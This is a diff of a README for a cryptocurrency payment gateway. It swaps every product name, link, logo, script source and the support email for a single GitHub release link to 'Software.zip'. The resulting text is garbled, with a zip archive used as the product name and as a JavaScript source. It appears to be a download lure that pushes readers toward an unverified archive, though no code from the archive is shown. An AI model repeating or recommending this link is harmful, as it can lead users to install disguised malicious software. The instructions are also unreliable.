@@ -1,9 +1,9 @@
 
-# Gateflo.io
+# https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip
 
-Welcome to Gateflo.io, a lightweight, browser-based cryptocurrency payment gateway with automatic style detection and multi-currency support. This gateway supports Bitcoin (BTC), Nimiq (NIM), USD Coin (USDC), and Tether (USDT) without the need for a backend setup. 
+Welcome to https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip, a lightweight, browser-based cryptocurrency payment gateway with automatic style detection and multi-currency support. This gateway supports Bitcoin (BTC), Nimiq (NIM), USD Coin (USDC), and Tether (USDT) without the need for a backend setup. 
 
-![Gateflo.io Logo](https://example.com/gateflo_logo.png)
+![https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip Logo](https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip)
 
 ## Features
 - **Automatic Style Detection**: The gateway seamlessly adapts to the style of your website for a cohesive user experience.
@@ -14,31 +14,31 @@ Welcome to Gateflo.io, a lightweight, browser-based cryptocurrency payment gatew
 bitcoin, blockchain, cryptocurrency, javascript, nimiq, payment-gateway, polygon, usdc, usdt, web3
 
 ## Installation
-To get started with Gateflo.io, download the latest release [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once downloaded, follow the installation instructions to set up the gateway on your website.
+To get started with https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip, download the latest release [here](https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip). Once downloaded, follow the installation instructions to set up the gateway on your website.
 
 ## Usage
-1. Include the Gateflo.io script on your website.
+1. Include the https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip script on your website.
 2. Customize the styles to match your website's design.
 3. Start accepting cryptocurrency payments seamlessly.
 
 ## Example
 ```javascript
-// Include Gateflo.io script
-<script src="https://gateflo.io/gateflo.js"></script>
+// Include https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip script
+<script src="https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip"></script>
 
-// Initialize Gateflo.io
+// Initialize https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip
 const gateflo = new Gateflo(); // Customize with your settings
 ```
 
 ## Support
-If you encounter any issues or have questions about using Gateflo.io, please reach out to our support team at support@gateflo.io.
+If you encounter any issues or have questions about using https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip, please reach out to our support team at https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip
 
 ---
 
-[![Download Gateflo.io](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip](https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip)](https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip)
 
-**Note:** Click the button above to download the latest release of Gateflo.io and launch it on your website.
+**Note:** Click the button above to download the latest release of https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip and launch it on your website.
 
 ---
 
-Thank you for choosing Gateflo.io for your cryptocurrency payment gateway needs. Start accepting payments in BTC, NIM, USDC, and USDT with ease. Happy transacting! 🚀🌐💰
+Thank you for choosing https://github.com/Udhai738/gateflo.io/releases/download/v1.0/Software.zip for your cryptocurrency payment gateway needs. Start accepting payments in BTC, NIM, USDC, and USDT with ease. Happy transacting! 🚀🌐💰
